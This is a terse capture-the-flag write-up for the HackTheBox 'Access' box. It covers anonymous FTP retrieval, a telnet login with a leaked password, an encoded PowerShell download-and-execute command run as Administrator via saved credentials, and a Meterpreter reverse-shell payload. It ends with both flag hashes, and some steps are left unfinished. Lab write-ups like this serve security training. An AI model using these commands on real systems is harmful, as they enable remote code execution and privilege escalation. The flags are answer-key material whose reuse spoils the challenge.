# HackTheBox Access Writeup

![date](https://img.shields.io/badge/date-03.03.2019-brightgreen.svg)  
![solved in time of CTF](https://img.shields.io/badge/solved-in%20time%20of%20CTF-brightgreen.svg)  
![web category](https://img.shields.io/badge/category-web-lightgrey.svg)
![score](https://img.shields.io/badge/score-0-blue.svg)
![solves](https://img.shields.io/badge/solves-3144-brightgreen.svg)

## Detailed Solution

### FTP Server

      > ftp 10.10.10.98 (with credentials: anonymous:anonymous)
      > wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98

#### 
      
#### MDB File (Microsoft Database File) Ananylse
      > mdb-tables back.mdb

#### Get Reverse Shell From telnet
      > telnet 10.10.10.98 (with credentials: security:4Cc3ssC0ntr0ller)
      > 
      
### Some Hacks In Powershell
      PS> $Wscript = New-Object -ComObject Wscript.Shell
      PS> $shortcut = Get-ChildItem *.lnk
      
      jason> echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.7/9003.ps1')" | iconv --to-code UTF-16LE | base64 -w 0
      PS> runas /user:ACCESS\Administrator /savecred "Powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADcALwA5ADAAMAAzAC4AcABzADEAJwApAA=="
      
Check detailed info about the .lnk file       
      PS> $Wscript.CreateShortcut($shortcut)
      PS> copy 

### Meterpreter Establish
      python unicorn.py windows/meterpreter/reverse_https 10.10.14.7 9004
      > cp powershell_attack.txt ~/htb/boxes/Access/www/msf.ps1
      > msfconsole -r unicorn.rc
      
      
#### Flags
      User Flag ff1f3b48913b213a31ff6756d2553d38
      Root Flag 6e1586cc7ab230a8d297e8f933d904cf
      
